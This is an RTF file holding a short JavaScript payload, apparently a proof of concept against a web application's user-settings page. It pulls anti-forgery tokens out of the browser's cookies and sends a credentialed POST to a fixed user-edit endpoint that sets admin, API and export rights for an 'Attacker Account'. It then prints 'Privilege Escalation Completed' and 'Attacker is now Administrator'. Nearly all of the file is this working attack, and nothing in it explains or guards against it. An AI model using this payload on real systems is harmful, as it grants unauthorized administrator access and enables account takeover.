{\rtf1\ansi\ansicpg1252\cocoartf2870
\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
{\colortbl;\red255\green255\blue255;}
{\*\expandedcolortbl;;}
\paperw11900\paperh16840\margl1440\margr1440\vieww11520\viewh8400\viewkind0
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0

\f0\fs24 \cf0 (function () \{\
  try \{\
    var AUTO_HEADER = true;\
    var m1 = document.cookie.match(/(?:^|; )__CustomRequestVerificationToken=([^;]*)/);\
    var m2 = document.cookie.match(/(?:^|; )__CustomRequestVerificationToken_FormFieldToken=([^;]*)/);\
    console.log('Cookies found:', !!m1, !!m2);\
    if (!m1 || !m2) throw new Error('tokens missing');\
\
    var csrf = m1[1] + ':' + m2[1];\
    var body = 'FirstName=Attacker&LastName=Account&IsAdmin=true&ApiAccess=true&CanExport=true&ProductUserLicenses%5BCRM_SUBSCRIPTION%5D=true&TimeZoneId=Central+Standard+Time&Currency=USD&DefaultAddressCountry=United+States&PreferredLanguage=en-US';\
\
    var x = new XMLHttpRequest();\
    x.open('POST', '/Settings/UserEdit/2316819', true);\
    x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');\
    x.setRequestHeader('X-Requested-With', 'XMLHttpRequest');\
    if (!AUTO_HEADER) x.setRequestHeader('Requestverificationtoken', csrf);\
    x.withCredentials = true;\
    x.onload  = function () \{ console.log('[4] response', x.status, x.responseText.slice(0, 300)); \};\
    x.onerror = function () \{ console.log('[4] network error'); \};\
    x.send(body);\
    console.clear();\
    console.log("%cPrivilege Escalation Completed",\
            "font-size: 20px; font-weight: bold;");\
    console.log("%cAttacker is now Administrator",\
            "font-size: 16px; font-weight: bold; color:red");\
  \} catch (e) \{\
    console.log('THREW:', e.message);\
  \}\
\})();}
